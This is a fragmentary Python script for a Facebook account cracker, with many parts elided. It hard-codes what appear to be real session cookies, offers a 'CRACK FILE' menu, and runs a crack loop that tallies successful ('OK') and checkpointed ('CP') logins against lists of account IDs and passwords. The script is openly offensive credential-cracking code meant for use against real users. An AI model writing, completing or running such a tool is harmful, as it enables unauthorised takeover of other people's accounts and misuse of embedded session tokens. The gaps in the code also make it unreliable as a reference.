...
import requests
cookies = {
    'datr': 'SlfPZGfWAQi4aqNxJIzZedwB',
    'sb': 'SlfPZHwEH2lpJJm3VUP0hGZB',
    'locale': 'ar_AR',
    'vpd': 'v1%3B720x393x2.75',
    'zsh': 'ASSMPIa1wwmi97g-kVrToLRx6F3vBgUMbQiWNIJNv8bei9Gt19Iacgce6FZWTu6sBgnOMTxRP4FcrmaVFDwTNX5vhiYp7rm4vuK0wvJyZzeuUq5lQ_m8y4jWVxgoar4sYI2xPQSFz1Y9-8jRJca_hmG88cnqkHNrph2h2GeiCrIXr7tvabQwxnk6fWiCJWaXcPqkWngxmQE3jUkRUuFTKgszj9H5GioeK8wxlsVGS7yH37FbVm40if8fgFh29YXV7TdwcoZjvS_jDJOLz0Vf6KNomkXDvrsV_6wz6CjekkaI3ZlhhaC2AFegG2IBwIpDugwY',
    'wl_cbv': 'v2%3Bclient_version%3A2301%3Btimestamp%3A1691405608',
    'm_pixel_ratio': '2.75',
    'wd': '393x720',
    'fr': '0IRveCzywRO3Id7w0.AWX05uWqVqZJyPwn68Rg3ABzGWM.Bkz1dK.Wr.AAA.0.0.Bk0RF4.AWWEaVKqoK4',
}
...
def menu():
	...
	_IPYTHONI_(f'\x1b[1;98m[ 1 ] CRACK FILE [WORK]')
	...
	if _____IPYTHONI_____ in ['1']:
		...
		back()
def error():
	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;91GARANAWA DWAWA')
	time.sleep(2)
	back()
#INPUT-FILE	
def F():
...
def passwrd():
	...
	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;97m CRACK COMPLETE ZHiRO CRACKER!')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r •EASY• {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
